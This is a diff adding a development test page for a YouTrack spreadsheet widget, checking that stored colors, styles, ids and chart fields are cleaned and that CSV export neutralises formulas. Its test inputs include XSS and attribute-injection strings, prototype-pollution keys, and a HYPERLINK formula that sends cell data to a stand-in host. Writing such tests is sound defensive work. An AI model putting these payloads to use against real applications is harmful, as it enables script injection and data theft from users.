@@ -1,0 +1,371 @@
+<!doctype html>
+<!--
+  Copyright 2026 Codeo
+
+  Licensed under the Apache License, Version 2.0 (the "License");
+  you may not use this file except in compliance with the License.
+  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<html lang="en">
+<head><meta charset="utf-8"><title>Spreadsheets for YouTrack – security tests</title>
+<style>body{font:13px system-ui;margin:16px}.fail{color:#c00}.ok{color:#080}pre{white-space:pre-wrap}</style></head>
+<body>
+<h1>Security tests (stored data cleaning)</h1>
+<div id="sum"></div>
+<pre id="out"></pre>
+<script src="sheet-core.js"></script>
+<script type="module">
+// Development only (not part of the release ZIP). Checks that everything another person can store is cleaned by
+// sheet-core.js (the same code runs on the server and in the widget), and that data the app itself writes survives.
+const Core = window.SheetCore;
+const results = [];
+const t = (name, fn) => { try { const r = fn(); results.push({ ok: r === true, name, got: r === true ? '' : r }); } catch (e) { results.push({ ok: false, name, got: 'threw ' + e.message }); } };
+const throws = (fn) => { try { fn(); return false; } catch (e) { return e.code === 400; } };
+const sorted = (o) => JSON.stringify(o, (k, v) => (v && typeof v === 'object' && !Array.isArray(v) ? Object.keys(v).sort().reduce((a, x) => { a[x] = v[x]; return a; }, {}) : v));
+const same = (a, b) => sorted(a) === sorted(b) || 'expected ' + sorted(b) + ' got ' + sorted(a);
+const XSS = 'blue" data-x="1';
+const has = (o, s) => JSON.stringify(o).includes(s);
+
+function workbook() {
+  const sh = Core.newSheet('Sheet1', 10, 5);
+  return { doc: Core.newWorkbook({ login: 'alice', name: 'Alice' }, [sh]), sh };
+}
+const R = (sh, r1, c1, r2, c2) => ({ r1: sh.rows[r1], c1: sh.cols[c1], r2: sh.rows[r2], c2: sh.cols[c2] });
+
+// ---------------------------------------------------------------- the reported injection and its relatives
+t('cf style colors that are not #rrggbb are dropped', () => {
+  const { sh } = workbook();
+  const o = Core.cleanObject('cf', 'cf1', { ...R(sh, 0, 0, 3, 0), type: 'gt', a: '1', style: { bg: XSS, fc: 'red;background:url(//x)', b: 1 } });
+  return same(o.style, { b: 1 });
+});
+t('cf style keeps #rrggbb colors (lowercased)', () => {
+  const { sh } = workbook();
+  return same(Core.cleanObject('cf', 'cf1', { ...R(sh, 0, 0, 3, 0), type: 'gt', a: '1', style: { bg: '#F4CCCC', fc: '#990000' } }).style, { bg: '#f4cccc', fc: '#990000' });
+});
+t('cf scale colors must all be #rrggbb and as many as the scale needs', () => {
+  const { sh } = workbook();
+  const bad = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'scale2', colors: ['#ffffff', XSS] });
+  const wrongCount = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'scale3', colors: ['#ffffff', '#000000'] });
+  const nonString = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'scale2', colors: [1, 2] });
+  const arrayTrick = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'scale2', colors: [['#ffffff'], ['#000000']] });
+  const good = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'scale2', colors: ['#FFFFFF', '#57bb8a'] });
+  return !('colors' in bad) && !('colors' in wrongCount) && !('colors' in nonString) && !('colors' in arrayTrick) && same(good.colors, ['#ffffff', '#57bb8a']);
+});
+t('cf data bar color must be #rrggbb', () => {
+  const { sh } = workbook();
+  return !('color' in Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'bar', color: XSS }));
+});
+t('cf with an unknown type is refused', () => throws(() => Core.cleanObject('cf', 'c', { type: 'constructor' })));
+t('table style must be one of the style names', () => {
+  const { sh } = workbook();
+  const o = Core.cleanObject('tables', 't1', { name: 'T1', ...R(sh, 0, 0, 3, 2), style: XSS });
+  const p = Core.cleanObject('tables', 't1', { name: 'T1', ...R(sh, 0, 0, 3, 2), style: 'constructor' });
+  return !('style' in o) && !('style' in p);
+});
+t('table name must be a string that matches the name rule', () => throws(() => Core.cleanObject('tables', 't1', { name: ['T1'] })));
+t('table filters: column ids, strings and known operators only', () => {
+  const { sh } = workbook();
+  const c0 = sh.cols[0];
+  const o = Core.cleanObject('tables', 't1', { name: 'T1', ...R(sh, 0, 0, 3, 2), filters: { [c0]: { vals: ['a', 1, { x: 1 }], cond: { op: 'zzz', a: 'x' } }, constructor: { vals: ['a'] }, 'bad key': { vals: ['a'] } } });
+  return same(o.filters, { [c0]: { vals: ['a'] } });
+});
+t('chart colors and unknown fields are dropped; type, sizes and ids are checked', () => {
+  const { sh } = workbook();
+  const o = Core.cleanObject('charts', 'ch1', { ...R(sh, 0, 0, 3, 1), ar: sh.rows[0], ac: sh.cols[3], type: 'pie" onload="x', colors: ['#000"/><img src=x onerror=alert(1)>'], w: 1e9, h: 'x', ox: -5, name: 'n', title: 'T' });
+  return same(o, { id: 'ch1', type: 'column', title: 'T', ...R(sh, 0, 0, 3, 1), ar: sh.rows[0], ac: sh.cols[3], ox: 0, w: 10000 });
+});
+t('a set operation loses a style that is not valid', () => {
+  const { sh } = workbook();
+  const [op] = Core.cleanOps([{ t: 'set', s: sh.id, k: sh.rows[0] + ':' + sh.cols[0], v: 'x', st: { bg: XSS, fc: '#00ff00', ha: 'left" x="', ff: 'x', bd: 'tb"', bc: 'url(x)', cur: '"x";}', extra: 1 } }]);
+  return same(op.st, { fc: '#00ff00', bd: 'tb', cur: 'x' });
+});
+t('the log gets cleaned operations: raw fields never come back', () => {
+  const { sh } = workbook();
+  const raw = [
+    { t: 'set', s: sh.id, k: sh.rows[0] + ':' + sh.cols[0], st: { bg: XSS }, evil: '<img>' },
+    { t: 'obj', s: sh.id, kind: 'cf', id: 'cf1', val: { ...R(sh, 0, 0, 3, 0), type: 'gt', style: { bg: XSS }, colors: [XSS], onload: 'x' } },
+    { t: 'sheet', s: sh.id, color: XSS, colW: { __proto__: null, [sh.cols[0]]: 50, constructor: 9 }, merges: [{ ...R(sh, 0, 0, 1, 1), x: XSS }] },
+    { t: 'addSheet', sheet: { ...Core.newSheet('S2', 2, 2), cf: [{ id: 'z', type: 'scale2', colors: [XSS, XSS] }] } }
+  ];
+  const clean = Core.cleanOps(raw);
+  // no such key anywhere (random ids may contain any letters, so the words are not searched in the whole text)
+  const keys = new Set();
+  JSON.stringify(clean, (k, v) => { keys.add(k); return v; });
+  return !has(clean, 'data-x') && !keys.has('evil') && !keys.has('onload') && !keys.has('constructor') || JSON.stringify(clean);
+});
+t('cleaning is idempotent', () => {
+  const { sh } = workbook();
+  const ops = [{ t: 'obj', s: sh.id, kind: 'cf', id: 'cf1', val: { ...R(sh, 0, 0, 3, 0), type: 'between', a: '1', b: '=A1', pct: false, style: { bg: '#f4cccc', fc: '#990000' } } }];
+  const once = Core.cleanOps(ops), twice = Core.cleanOps(once);
+  return JSON.stringify(once) === JSON.stringify(twice);
+});
+
+// ---------------------------------------------------------------- ids, keys and structure
+t('"constructor" and non-string ids are refused', () => {
+  const { sh } = workbook();
+  return throws(() => Core.cleanOps([{ t: 'set', s: sh.id, k: 'constructor:' + sh.cols[0], v: '1' }]))
+    && throws(() => Core.cleanOps([{ t: 'obj', s: sh.id, kind: 'cf', id: 'constructor', val: { type: 'gt' } }]))
+    && !Core.isId(123) && !Core.isId(['abc']) && Core.isId('abc123');
+});
+t('cell keys have exactly two id parts', () => {
+  const { sh } = workbook();
+  return throws(() => Core.cleanOps([{ t: 'set', s: sh.id, k: sh.rows[0] + ':' + sh.cols[0] + ':x', v: '1' }]));
+});
+t('applyOps ignores a cell key with extra parts even without validation', () => {
+  const { doc, sh } = workbook();
+  Core.applyOps(doc, [{ t: 'set', s: sh.id, k: sh.rows[0] + ':' + sh.cols[0] + ':' + 'x'.repeat(100), v: '1' }], { validate: false });
+  return Object.keys(sh.cells).length === 0;
+});
+t('duplicate ids in one insert are added once', () => {
+  const { doc, sh } = workbook();
+  Core.applyOps(doc, Core.cleanOps([{ t: 'rows', s: sh.id, at: -1, add: ['aaa1', 'aaa1', 'aaa2'] }]));
+  return sh.rows.length === 12;
+});
+t('too many row and column changes in one batch are refused', () => {
+  const { sh } = workbook();
+  return throws(() => Core.cleanOps(Array.from({ length: 21 }, (_, i) => ({ t: 'rows', s: sh.id, at: -1, add: ['r' + i] }))));
+});
+t('merges: only existing, non-overlapping ranges larger than one cell', () => {
+  const { doc, sh } = workbook();
+  Core.applyOps(doc, Core.cleanOps([{ t: 'sheet', s: sh.id, merges: [R(sh, 0, 0, 1, 1), R(sh, 1, 1, 2, 2), R(sh, 4, 4, 4, 4), { r1: 'nope', c1: sh.cols[0], r2: sh.rows[1], c2: sh.cols[1] }, R(sh, 3, 0, 5, 1)] }]));
+  return sh.merges.length === 2;
+});
+t('defined names: no prototype tricks', () => {
+  const { doc } = workbook();
+  Core.applyOps(doc, Core.cleanOps([{ t: 'name', name: '__proto__', ref: '=1' }]));
+  return Object.getPrototypeOf(doc.names) === Object.prototype && doc.names.__PROTO__ === '=1';
+});
+
+// ---------------------------------------------------------------- whole workbooks (stored by older versions)
+t('cleanDoc removes stored payloads and keeps the data', () => {
+  const { doc, sh } = workbook();
+  sh.cells[sh.rows[0] + ':' + sh.cols[0]] = { v: 'hello', st: { bg: XSS, b: 1 } };
+  sh.cf.push({ id: 'cf1', ...R(sh, 0, 0, 3, 0), type: 'gt', a: '1', style: { bg: XSS } });
+  sh.tables.push({ id: 't1', name: 'T1', ...R(sh, 0, 0, 3, 2), style: XSS });
+  sh.charts.push({ id: 'ch1', ...R(sh, 0, 0, 3, 1), ar: sh.rows[0], ac: sh.cols[3], colors: [XSS] });
+  sh.color = XSS;
+  const c = Core.cleanDoc(doc);
+  return !has(c, 'data-x') && c.sheets[0].cells[sh.rows[0] + ':' + sh.cols[0]].v === 'hello' && c.sv === Core.CLEAN_VERSION || JSON.stringify(c);
+});
+t('cleanDoc makes sheet ids, sheet names and table names unique', () => {
+  const a = Core.newSheet('Plan', 3, 3), b = JSON.parse(JSON.stringify(a)), d = Core.newSheet('plan', 3, 3);
+  a.tables.push({ id: 't1', name: 'Budget', r1: a.rows[0], c1: a.cols[0], r2: a.rows[1], c2: a.cols[1] });
+  d.tables.push({ id: 't1', name: 'budget', r1: d.rows[0], c1: d.cols[0], r2: d.rows[1], c2: d.cols[1] });
+  const c = Core.cleanDoc({ rev: 3, sheets: [a, b, d], names: {} });
+  try { Core.checkWorkbook(c); } catch (e) { return e.message; }
+  return c.sheets.length === 2 && c.rev === 3;
+});
+t('cleanDoc never throws on garbage', () => Core.cleanDoc(null) === null && Core.cleanDoc({ sheets: 'x' }) === null && Core.cleanDoc({ sheets: [1, null, {}] }).sheets.length === 1);
+
+// ---------------------------------------------------------------- values that cannot be converted, long rule texts
+const BAD = JSON.parse('{"toString":1}'); // an object whose conversion to text fails
+t('a value that cannot be converted to text is dropped on its own; the rest of the sheet is kept', () => {
+  const { doc, sh } = workbook();
+  const k0 = sh.rows[0] + ':' + sh.cols[0], k1 = sh.rows[1] + ':' + sh.cols[0];
+  sh.cells[k0] = { v: BAD, n: BAD, st: { fs: BAD, cur: BAD, bd: BAD, dp: BAD } };
+  sh.cells[k1] = { v: 'kept' };
+  sh.freeze = { r: BAD, c: 1 };
+  sh.colW = { [sh.cols[0]]: BAD };
+  sh.name = '///';
+  const c = Core.cleanDoc(JSON.parse(JSON.stringify(doc)));
+  const s = c.sheets[0];
+  return (c.sheets.length === 1 && s.id === sh.id && s.name === 'Sheet' && !s.cells[k0] && s.cells[k1].v === 'kept' && s.freeze.r === 0 && s.freeze.c === 1 && !Object.keys(s.colW).length) || JSON.stringify(c.sheets.map((x) => x.name));
+});
+t('changes with values that cannot be converted to text are refused, and skipped in a log', () => {
+  const { sh } = workbook();
+  const k = sh.rows[0] + ':' + sh.cols[0];
+  const ops = [{ t: 'set', s: sh.id, k, v: BAD }, { t: 'set', s: sh.id, k, n: BAD }, { t: 'name', name: 'X', ref: BAD }, { t: BAD }, { t: 'set', s: sh.id, k, v: 'ok' }];
+  return throws(() => Core.cleanOps([ops[0]])) && throws(() => Core.cleanOps([ops[1]])) && throws(() => Core.cleanOps([ops[2]])) && throws(() => Core.cleanOps([ops[3]])) &&
+    same(Core.cleanOps(ops, true), [{ t: 'set', s: sh.id, k, v: 'ok' }]);
+});
+t('a stored creation revision above the current revision is ignored, and a broken revision reads as 0', () => {
+  const { doc } = workbook();
+  const a = Core.cleanDoc({ ...doc, rev: 100, base: 50 }), b = Core.cleanDoc({ ...doc, rev: 100, base: 1e300 }), c = Core.cleanDoc({ ...doc, rev: 'x', base: 5 });
+  return (a.base === 50 && !('base' in b) && c.rev === 0 && !('base' in c)) || JSON.stringify([a.base, b.base, c.rev, c.base]);
+});
+t('checking a workbook never fails on names that cannot be converted to text', () => {
+  const { doc } = workbook();
+  const d = JSON.parse(JSON.stringify(doc));
+  d.sheets[0].name = BAD;
+  d.sheets[0].tables = [{ name: BAD }, null];
+  try { Core.checkWorkbook(d); return true; } catch (e) { return e.code === 400 || 'threw ' + e.message; }
+});
+t('rule values and formulas longer than an Excel formula (8192 characters) are dropped', () => {
+  const { sh } = workbook();
+  const long = '=' + '1+'.repeat(5000) + '1';
+  const cf = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'formula', formula: long });
+  const dv = Core.cleanObject('dv', 'd', { ...R(sh, 0, 0, 3, 0), type: 'formula', formula: long });
+  const ok = Core.cleanObject('cf', 'c', { ...R(sh, 0, 0, 3, 0), type: 'formula', formula: '=' + '1+'.repeat(4000) + '1' });
+  return !('formula' in cf) && !('formula' in dv) && ok.formula.length === 8002;
+});
+
+// ---------------------------------------------------------------- server and browsers hold the same workbook
+// The server cleans the stored workbook every time it reads it, while open browsers keep applying changes to their
+// copy. So cleaning must never change a workbook that changes produced: random batches, checked after each one.
+function cleaningKeepsChanges(seed0) {
+  let seed = seed0;
+  const rnd = () => { seed = (seed + 0x6D2B79F5) | 0; let x = Math.imul(seed ^ (seed >>> 15), 1 | seed); x = (x + Math.imul(x ^ (x >>> 7), 61 | x)) ^ x; return ((x ^ (x >>> 14)) >>> 0) / 4294967296; };
+  const pick = (a) => a[Math.floor(rnd() * a.length)];
+  const newId = () => { const n = 1 + Math.floor(rnd() * 16); let s = ''; while (s.length < n) s += Math.floor(rnd() * 36).toString(36); return s; };
+  const doc = Core.newWorkbook({ login: 'a', name: 'A' }, [Core.newSheet('S', 12, 6)]);
+  const part = (d) => sorted({ sheets: d.sheets, names: d.names });
+  let tables = 0;
+  for (let i = 0; i < 300; i++) {
+    const s = doc.sheets[0];
+    // small ranges next to each other, so that deleting a row or column often moves or removes their corners
+    const R = () => { const r = Math.floor(rnd() * (s.rows.length - 1)), c = Math.floor(rnd() * (s.cols.length - 1)); const tall = rnd() < 0.5; return { r1: s.rows[r], c1: s.cols[c], r2: s.rows[r + (tall || rnd() < 0.3 ? 1 : 0)], c2: s.cols[c + (!tall || rnd() < 0.3 ? 1 : 0)] }; };
+    const ops = [];
+    const n = 1 + Math.floor(rnd() * 4);
+    for (let j = 0; j < n; j++) {
+      const kind = Math.floor(rnd() * 11);
+      if (kind === 0) ops.push({ t: 'set', s: s.id, k: pick(s.rows) + ':' + pick(s.cols), v: rnd() < 0.2 ? null : String(Math.floor(rnd() * 100)), st: rnd() < 0.3 ? { b: 1, bg: '#ff0000' } : undefined, n: rnd() < 0.1 ? 'note' : undefined });
+      else if (kind === 1 && s.rows.length < 40) ops.push({ t: 'rows', s: s.id, at: Math.floor(rnd() * s.rows.length), add: [newId(), newId()] });
+      else if (kind === 2 && s.rows.length > 3) ops.push({ t: 'rows', s: s.id, del: [pick(s.rows)] });
+      else if (kind === 3 && s.cols.length < 20) ops.push({ t: 'cols', s: s.id, at: Math.floor(rnd() * s.cols.length), add: [newId()] });
+      else if (kind === 4 && s.cols.length > 3) ops.push({ t: 'cols', s: s.id, del: [pick(s.cols)] });
+      else if (kind === 5) ops.push({ t: 'sheet', s: s.id, merges: [R(), R(), R()], rowH: { [pick(s.rows)]: 40, [newId()]: 50 }, hc: { [pick(s.cols)]: 1, [newId()]: 1 } });
+      else if (kind === 6) ops.push({ t: 'obj', s: s.id, kind: 'tables', id: 't' + (tables++ % 5), val: { name: 'T' + tables, ...R(), header: true, filter: true, filters: { [pick(s.cols)]: { vals: ['1'] } }, style: 'green' } });
+      else if (kind === 7) ops.push({ t: 'obj', s: s.id, kind: 'cf', id: 'c' + Math.floor(rnd() * 5), val: { ...R(), type: pick(['gt', 'scale2', 'bar', 'formula']), a: '5', formula: '=A1>1', colors: ['#ffffff', '#000000'], color: '#3369d6', style: { bg: '#f4cccc' } } });
+      else if (kind === 8) ops.push({ t: 'obj', s: s.id, kind: pick(['charts', 'dv']), id: 'o' + Math.floor(rnd() * 5), val: { ...R(), type: pick(['list', 'number', 'column', 'pie']), source: 'a,b', op: 'between', a: '1', b: '2', ar: pick(s.rows), ac: pick(s.cols), ox: 5, oy: 5, w: 300, h: 200 } });
+      else if (kind === 9) ops.push({ t: 'name', name: pick(['Rate', 'Maß', 'Straße_1', 'x.y', 'ß'.repeat(40)]), ref: rnd() < 0.2 ? null : '=1' });
+      else ops.push({ t: 'sheet', s: s.id, freeze: { r: Math.floor(rnd() * 3), c: Math.floor(rnd() * 3) }, colW: { [pick(s.cols)]: 120 } });
+    }
+    // as on the server: a batch that cleaning refuses is not applied at all
+    let clean = null;
+    try { clean = Core.cleanOps(ops); } catch (e) { if (e.code !== 400) return 'cleaning threw ' + e.message; }
+    if (clean) { try { Core.applyOps(doc, clean); } catch (e) { if (e.code !== 400) return 'batch ' + i + ' threw ' + e.message; } }
+    const a = part(JSON.parse(JSON.stringify(doc))), b = part(Core.cleanDoc(JSON.parse(JSON.stringify(doc))));
+    if (a !== b) {
+      let at = 0;
+      while (at < a.length && a[at] === b[at]) at++;
+      return 'seed ' + seed0 + ' batch ' + i + ' ' + JSON.stringify(ops).slice(0, 300) + '\n  kept:    ' + a.slice(Math.max(0, at - 80), at + 120) + '\n  cleaned: ' + b.slice(Math.max(0, at - 80), at + 120);
+    }
+  }
+  return true;
+}
+t('cleaning never changes a workbook that changes produced (3 x 300 random batches)', () => {
+  for (const seed of [12345, 777, 4242]) { const r = cleaningKeepsChanges(seed); if (r !== true) return r; }
+  return true;
+});
+t('an object is measured the same with and without its own id (a change sends it without one)', () => {
+  const { sh } = workbook();
+  const val = { name: 'Big', r1: sh.rows[0], c1: sh.cols[0], r2: sh.rows[3], c2: sh.cols[2], filters: { [sh.cols[0]]: { vals: [] } } };
+  while (JSON.stringify(val).length < Core.LIMITS.objectChars - 12) val.filters[sh.cols[0]].vals.push('v' + val.filters[sh.cols[0]].vals.length);
+  try {
+    const sent = Core.cleanOps([{ t: 'obj', s: sh.id, kind: 'tables', id: 'tbl0123456789ab', val }])[0].val; // cleaned: has the id
+    return !!Core.cleanObject('tables', 'tbl0123456789ab', sent);
+  } catch (e) { return 'threw ' + e.message; }
+});
+t('list items longer than 8192 characters are kept (a list without its items would refuse every entry)', () => {
+  const { sh } = workbook();
+  const items = Array.from({ length: 820 }, (_, i) => 'PRD-' + String(i).padStart(6, '0')).join(', ');
+  const o = Core.cleanObject('dv', 'd1', { ...R(sh, 0, 0, 3, 0), type: 'list', strict: true, source: items });
+  return (items.length > 8192 && o.source === items) || 'source ' + (o.source ? o.source.length : 'dropped');
+});
+t('a sheet keeps up to 5000 merged ranges, as 1.2.5 did', () => {
+  const sh = Core.newSheet('M', 5200, 3);
+  sh.merges = sh.rows.slice(0, 5100).map((r) => ({ r1: r, c1: sh.cols[0], r2: r, c2: sh.cols[2] }));
+  return Core.cleanSheet(sh).merges.length === 5000 || Core.cleanSheet(sh).merges.length;
+});
+t('a defined name is refused when its capital form breaks the name rule ("ß" becomes "SS")', () =>
+  throws(() => Core.cleanOps([{ t: 'name', name: 'ß'.repeat(40), ref: '=1' }])) && Core.validName('Maß') && !Core.validName('ß'.repeat(40)));
+t('stored sizes and hidden flags are kept only for rows and columns the sheet has', () => {
+  const { doc, sh } = workbook();
+  Core.applyOps(doc, Core.cleanOps([{ t: 'sheet', s: sh.id, rowH: { [sh.rows[0]]: 40, zzzz: 50 }, hc: { [sh.cols[1]]: 1, yyyy: 1 } }]));
+  const s = doc.sheets[0];
+  return (same(s.rowH, { [sh.rows[0]]: 40 }) === true && same(s.hc, { [sh.cols[1]]: 1 }) === true) || JSON.stringify([s.rowH, s.hc]);
+});
+t('an object does not grow over the size limit when its corners move to longer row ids', () => {
+  const { sh } = workbook();
+  const big = { name: 'Big', r1: 'a', c1: sh.cols[0], r2: sh.rows[3], c2: sh.cols[2], filters: { [sh.cols[0]]: { vals: [] } } };
+  // fill the filter values up to just under the limit
+  while (JSON.stringify(big).length < Core.LIMITS.objectChars - 40) big.filters[sh.cols[0]].vals.push('vvvvvvvvvv');
+  const longer = { ...big, r1: 'abcdefghijklmnop' };
+  try { return !!Core.cleanObject('tables', 't1', big) && !!Core.cleanObject('tables', 't1', longer); } catch (e) { return 'threw ' + e.message; }
+});
+
+// ---------------------------------------------------------------- where colors and text are drawn
+const { renderChart } = await import('./charts.js');
+const UI = await import('./ui.js');
+t('charts draw only #rrggbb colors and escaped text, whatever is stored', () => {
+  const data = { categories: ['a', 'b<i>'], series: [{ name: 'S"<x>', values: [1, 2] }, { name: 'T', values: [3, 4] }] };
+  const colors = ['#000"/><img src=x onerror=alert(1)>', 'url(http://x/a)', '#00000g', ['#000000'], '#000000\n'];
+  for (const type of ['column', 'bar', 'stacked', 'line', 'area', 'pie', 'doughnut', 'scatter', 'constructor']) {
+    const svg = renderChart({ type, colors, title: '<img src=x onerror=1>', legend: true }, data, 480, 280, 'en');
+    if (/<img|<i>|<x>|url\(/.test(svg)) return type + ': ' + svg.slice(0, 200);
+    const odd = [...svg.matchAll(/(?:fill|stroke)="([^"]*)"/g)].map((m) => m[1]).filter((v) => !/^(#[0-9a-fA-F]{6}|none)$/.test(v));
+    if (odd.length) return type + ': ' + odd.join(',');
+  }
+  const own = renderChart({ type: 'column', colors: ['#112233', 'bad', '#AABBCC'] }, data, 480, 280, 'en');
+  return (own.includes('fill="#112233"') && own.includes('fill="#AABBCC"')) || 'valid colors were not used';
+});
+t('the shared color check of the widget passes #rrggbb only (toolbar bars, rule previews, menus)', () => {
+  const hexOk = UI.hexColor('#a1B2c3') === '#a1B2c3' && ['red', '#fff', '#ffffff;x', 'url(x)', ['#ffffff'], 5, null].every((c) => UI.hexColor(c) === null);
+  const tc = UI.themedColors('url(x)', 'red'), tc2 = UI.themedColors(['#ffffff'], null);
+  const btn = document.createElement('button');
+  UI.paintBar(btn, 'url(http://x/b)', false);
+  return (hexOk && tc.cls === '' && !tc.parts.length && tc2.cls === '' && btn.style.getPropertyValue('--cur') === 'transparent') || JSON.stringify({ hexOk, tc, tc2, cur: btn.style.getPropertyValue('--cur') });
+});
+{
+  const F = await import('./formula.js');
+  const IO = await import('./io.js');
+  const { doc, sh } = workbook();
+  const put = (r, v) => { sh.cells[sh.rows[r] + ':' + sh.cols[0]] = { v }; };
+  put(0, "'=HYPERLINK(\"https://x/?d=\"&A2,\"Open\")"); put(1, "'@SUM(1)"); put(2, '-5'); put(3, "'-2+3"); put(4, 'plain');
+  const csv = await IO.writeCsv(new F.Engine(doc, 'en-US'), sh, 'en-US').text();
+  const lines = csv.replace(/^﻿/, '').split('\r\n');
+  t('CSV export puts a quote before text that a spreadsheet app would run as a formula', () =>
+    (lines[0].startsWith('"\'=HYPERLINK(') && lines[1] === "'@SUM(1)" && lines[2] === '-5' && lines[3] === "'-2+3" && lines[4] === 'plain') || JSON.stringify(lines));
+}
+
+// ---------------------------------------------------------------- data the app writes must survive unchanged
+t('objects written by the app are kept as they are', () => {
+  const { sh } = workbook();
+  const c0 = sh.cols[0];
+  const samples = [
+    ['tables', { id: 't1', name: 'Budget', ...R(sh, 0, 0, 5, 3), header: true, totals: true, banded: true, filter: true, style: 'green', filters: { [c0]: { vals: ['A', 'B'], cond: { op: 'contains', a: 'x' } } } }],
+    ['tables', { id: 't2', name: 'Plain', ...R(sh, 0, 0, 2, 2), header: true }],
+    ['cf', { id: 'c1', ...R(sh, 0, 0, 5, 0), type: 'between', a: '1', b: '=$B$1', pct: false, style: { bg: '#f4cccc', fc: '#990000' } }],
+    ['cf', { id: 'c2', ...R(sh, 0, 0, 5, 0), type: 'formula', a: '', b: '', pct: false, formula: '=A1>0', style: { b: 1 } }],
+    ['cf', { id: 'c3', ...R(sh, 0, 0, 5, 0), type: 'scale3', a: '', b: '', pct: false, style: null, colors: ['#e67c73', '#ffd666', '#57bb8a'] }],
+    ['cf', { id: 'c4', ...R(sh, 0, 0, 5, 0), type: 'bar', a: '', b: '', pct: false, style: null, color: '#3369d6' }],
+    ['cf', { id: 'c5', ...R(sh, 0, 0, 5, 0), type: 'top', a: '10', b: '', pct: true, style: {} }],
+    ['dv', { id: 'd1', ...R(sh, 0, 1, 5, 1), type: 'list', strict: true, msg: null, source: 'Draft, In review, Approved', arrows: 'always' }],
+    ['dv', { id: 'd2', ...R(sh, 0, 1, 5, 1), type: 'number', strict: false, msg: 'Between 1 and 10', op: 'between', a: '1', b: '10' }],
+    ['dv', { id: 'd3', ...R(sh, 0, 1, 5, 1), type: 'checkbox', strict: true, msg: null }],
+    ['dv', { id: 'd4', ...R(sh, 0, 1, 5, 1), type: 'formula', strict: true, msg: null, formula: '=A1<>""' }],
+    ['charts', { id: 'h1', type: 'line', title: 'Costs', legend: false, ...R(sh, 0, 0, 5, 2), ar: sh.rows[0], ac: sh.cols[4], ox: 12, oy: 0, w: 480, h: 280 }],
+    ['solver', { id: 'model', obj: '=$B$6', goal: 'value', value: '2.125', vars: ['=$D$2:$D$4'], cons: [{ l: '=$C$7', op: 'le', r: '=100' }, { l: '=$D$2:$D$4', op: 'int', r: '' }], nonneg: true, method: 'lp', opts: { precision: 1e-6, scaling: true, showIter: false, ignoreInt: false, intTolerance: 1, maxTime: 0, iterations: 0, maxSubproblems: 0, maxFeasible: 0, convergence: 1e-4, derivatives: 'central', multistart: true, population: 100, seed: 7, requireBounds: true, mutation: 0.075, maxNoImprove: 30 } }],
+    ['scenarios', { id: 's1', name: 'Best case', cells: ['=$B$3', '=$C$3'], values: [12.5, 'text'], comment: 'Created by Alice' }]
+  ];
+  const bad = samples.filter(([kind, o]) => sorted(Core.cleanObject(kind, o.id, o)) !== sorted(o)).map(([kind, o]) => kind + ' ' + o.id + ': ' + sorted(Core.cleanObject(kind, o.id, o)));
+  return !bad.length || bad.join('\n');
+});
+t('a normal batch from the widget is applied the same way after cleaning', () => {
+  const a = workbook(), b = { doc: JSON.parse(JSON.stringify(a.doc)) };
+  const sh = a.sh;
+  const ops = [
+    { t: 'set', s: sh.id, k: sh.rows[0] + ':' + sh.cols[0], v: '=SUM(B1:B3)', st: { b: 1, nf: 'cur', cur: '€', dp: 2, bg: '#fff2cc' } },
+    { t: 'sheet', s: sh.id, colW: { [sh.cols[0]]: 120 }, hr: { [sh.rows[2]]: 1 }, freeze: { r: 1, c: 0 }, color: '#3369d6' },
+    { t: 'rows', s: sh.id, at: 2, add: ['n1', 'n2'] },
+    { t: 'name', name: 'Rate', ref: '=0.18' }
+  ];
+  Core.applyOps(a.doc, ops);
+  Core.applyOps(b.doc, Core.cleanOps(ops));
+  return JSON.stringify(a.doc) === JSON.stringify(b.doc) || 'differs';
+});
+
+const fails = results.filter((r) => !r.ok);
+document.getElementById('sum').innerHTML = `<b class="${fails.length ? 'fail' : 'ok'}">${results.length - fails.length} / ${results.length} passed</b>`;
+document.getElementById('out').textContent = fails.map((f) => 'FAIL ' + f.name + '\n  ' + f.got).join('\n\n');
+</script>
+</body>
+</html>
